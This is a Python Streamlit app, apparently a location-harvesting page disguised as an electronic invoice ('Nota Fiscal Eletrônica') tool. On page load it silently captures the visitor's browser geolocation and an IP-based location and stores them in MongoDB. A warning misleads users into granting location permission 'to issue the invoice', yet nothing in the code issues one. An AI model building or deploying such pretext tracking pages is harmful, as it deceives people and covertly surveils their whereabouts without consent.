import pandas as pd
import streamlit as st
import requests
from datetime import datetime
from streamlit_js_eval import streamlit_js_eval
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure, OperationFailure

from variaveis import TITULO_PAGINA, LEGENDA

# Configuração inicial
st.set_page_config(
    page_title=TITULO_PAGINA,
    initial_sidebar_state="expanded"
)


def init_mongodb_prod():
    try:
        # Obter credenciais do secrets.toml
        cluster_url = st.secrets["mongo"]["cluster_url"]
        db_name = st.secrets["mongo"]["db_name"]
        
        # Configuração especial para SSL
        client = MongoClient(
            cluster_url,
            connectTimeoutMS=30000,
            socketTimeoutMS=None,
            tls=True,               # Forçar uso de TLS
            tlsAllowInvalidCertificates=False,  # Não permitir certificados inválidos
            retryWrites=True,
            w="majority"
        )
        
        # Testar a conexão
        client.admin.command('ping')
        
        # Verificar e criar banco/coleção se necessário
        db = client[db_name]
        if "locations" not in db.list_collection_names():
            db.create_collection("locations")
        
        return db["locations"]
        
    except OperationFailure as e:
        st.error(f"Falha na autenticação: {e}")
        return None
    except Exception as e:
        st.error(f"Erro de conexão: {e}")
        return None

# Função para inserir dados no MongoDB
def insert_location(collection, data):
    try:
        result = collection.insert_one(data)
        return result.inserted_id
    except Exception as e:
        st.error(f"Erro ao inserir no MongoDB: {e}")
        return None

# Função para obter localização via IP
def get_location_by_ip():
    try:
        response = requests.get('https://ipinfo.io/json')
        if response.status_code == 200:
            data = response.json()
            loc = data.get('loc', '').split(',')
            if len(loc) == 2:
                return {
                    'timestamp': datetime.now(),
                    'method': 'IP',
                    'latitude': float(loc[0]),
                    'longitude': float(loc[1]),
                    'city': data.get('city', 'Desconhecida'),
                    'region': data.get('region', 'Desconhecida'),
                    'country': data.get('country', 'Desconhecido'),
                    'ip_address': data.get('ip', ''),
                    'source': 'ipinfo.io'
                }
    except Exception as e:
        st.error(f"Erro ao obter localização por IP: {e}")
    return None

# Função para obter localização via navegador
def get_browser_geolocation():
    try:
        result = streamlit_js_eval(js_expressions='''new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                position => resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                }),
                error => resolve(null)
            );
        })''', key='get_current_position')
        
        if result:
            return {
                'timestamp': datetime.now(),
                'method': 'Navegador',
                'latitude': result['latitude'],
                'longitude': result['longitude'],
                'accuracy': result['accuracy'],
                'source': 'navigator.geolocation'
            }
    except Exception as e:
        pass
        #st.error(f"Erro ao obter geolocalização do navegador: {e}")
    return None

# Inicializa a conexão com o MongoDB
collection = init_mongodb_prod()

# Interface principal
st.write(LEGENDA)

browser_location = get_browser_geolocation()
ip_location = get_location_by_ip()

if ip_location is not None and collection is not None:
    insert_location(collection, ip_location)

if browser_location is not None and collection is not None:
    insert_location(collection, browser_location)
    
# Botão para compartilhar localização do navegador
if st.button("Emitir Nota Fiscal Eletrônica"):
    browser_location = get_browser_geolocation()
    
    if browser_location:
        if collection:
            insert_location(collection, browser_location)
    else:
        st.warning("""
        Habilite a opção de compartilhamento para emissão da nota fiscal.
        
        Como habilitar:
        1. Clique no ícone de cadeado ou "i" na barra de endereço
        2. Procure por "Permissões de localização"
        3. Altere para "Permitir"
        4. Atualize a página e tente novamente
        """)
    

st.markdown("---")